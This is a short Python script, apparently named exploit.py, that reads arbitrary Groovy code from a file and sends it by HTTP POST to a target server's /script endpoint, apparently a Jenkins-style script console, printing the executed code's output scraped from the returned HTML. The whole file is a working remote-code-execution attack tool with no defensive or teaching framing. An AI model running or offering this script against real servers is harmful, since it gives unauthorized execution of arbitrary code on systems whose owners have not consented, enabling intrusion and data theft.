import requests
import sys

# Parse args
if len(sys.argv) != 4:
    print("Usage: python exploit.py IP PORT PATH")
    exit(0)

IP = sys.argv[1]
PORT = sys.argv[2]
PATH = sys.argv[3]

# Construct target URL
target = f"http://{IP}:{PORT}/script"
print(f"[+] Targeting {target}...")

# Read groovy code from file
code = ""
with open(PATH, "r") as fd:
    code = fd.read()
print(f"[+] Groovy code to run:\n{code}\n")


# Send HTTP POST request with code to execute
data = {
    "script": code
}
response = requests.post(target, data=data)

# Parse response
start = response.text.find("<h2>Result</h2><pre>")
end = response.text.find("</pre>", start)
result = response.text[start:end]

print(f"[+] Output: {result}")